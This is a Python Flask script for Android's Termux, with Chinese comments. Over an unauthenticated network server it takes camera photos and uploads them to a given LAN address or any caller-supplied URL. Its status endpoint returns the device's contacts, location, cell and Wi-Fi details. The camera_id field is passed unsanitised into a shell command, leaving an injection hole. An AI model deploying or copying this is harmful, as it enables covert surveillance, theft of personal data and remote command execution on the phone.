import os
import requests
import time
import tempfile
import subprocess
import json
from flask import Flask, jsonify, request

app = Flask(__name__)

# 配置参数
DEFAULT_SERVER_URL = "http://192.168.31.152:5001/cap_picture"  # 默认上传服务器地址
CAMERA_ID = 0  # 0=后置摄像头，1=前置摄像头
MAX_RETRIES = 3  # 最大重试次数

def capture_photo(camera_id):
    """使用 termux-camera-photo 捕获照片并返回文件内容"""
    try:
        # 创建临时文件
        with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as tmpfile:
            temp_path = tmpfile.name

        # 使用 termux API 拍照
        os.system(f"termux-camera-photo -c {camera_id} {temp_path}")

        # 读取照片内容
        with open(temp_path, 'rb') as f:
            image_data = f.read()

        # 删除临时文件
        os.unlink(temp_path)
        return image_data

    except Exception as e:
        print(f"拍照失败: {str(e)}")
        return None

def send_image_to_server(image_data, server_url=None):
    """发送图片到服务器"""
    if server_url is None:
        server_url = DEFAULT_SERVER_URL

    try:
        files = {'image': ('capture.jpg', image_data, 'image/jpeg')}
        response = requests.post(server_url, files=files, timeout=10)

        if response.status_code == 200:
            return True, response.text
        else:
            return False, f"服务器返回错误: {response.status_code} - {response.text}"
    except Exception as e:
        return False, f"发送失败: {str(e)}"

@app.route('/capture', methods=['POST'])
def capture():
    """拍照并上传到指定服务器"""
    # 获取可选的服务器URL
    server_url = request.json.get('server_url') if request.json else None
    camera_id = request.json.get('camera_id') if request.json else CAMERA_ID
    
    # 捕获图像
    image_data = capture_photo(camera_id= camera_id)
    if image_data is None:
        return jsonify({
            'success': False,
            'message': '拍照失败'
        }), 500

    # 发送图像（带重试机制）
    for attempt in range(MAX_RETRIES):
        success, message = send_image_to_server(image_data, server_url)
        if success:
            return jsonify({
                'success': True,
                'message': message,
                'attempt': attempt + 1
            })
        time.sleep(1)

    return jsonify({
        'success': False,
        'message': f'发送失败，已达到最大重试次数 ({MAX_RETRIES})'
    }), 500
@app.route('/status', methods=['GET'])
def status():
    """检查服务状态"""
    results = {}
    
    # 使用字典存储命令与说明的映射
    commands = {
        'battery': 'termux-battery-status',
        'contacts': 'termux-contact-list',
        'camera_info': 'termux-camera-info',
        'cell_info': 'termux-telephony-cellinfo',
        'device_info': 'termux-telephony-deviceinfo',
        'wifi': 'termux-wifi-connectioninfo',
        'location': 'termux-location -p network'
    }

    for key, cmd in commands.items():
        try:
            # 捕获命令输出
            output = subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT)
            # 解析JSON并存储
            results[key] = json.loads(output.decode('utf-8'))
        except subprocess.CalledProcessError as e:
            results[key] = {'error': f'Command failed ({e.returncode})', 'output': e.output.decode()}
        except Exception as e:
            results[key] = {'error': str(e)}

    return jsonify({
        'status': 'running',
        'camera_id': CAMERA_ID,
        'default_server': DEFAULT_SERVER_URL,
        'system_info': results  # 新增系统信息字段
    })

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5005)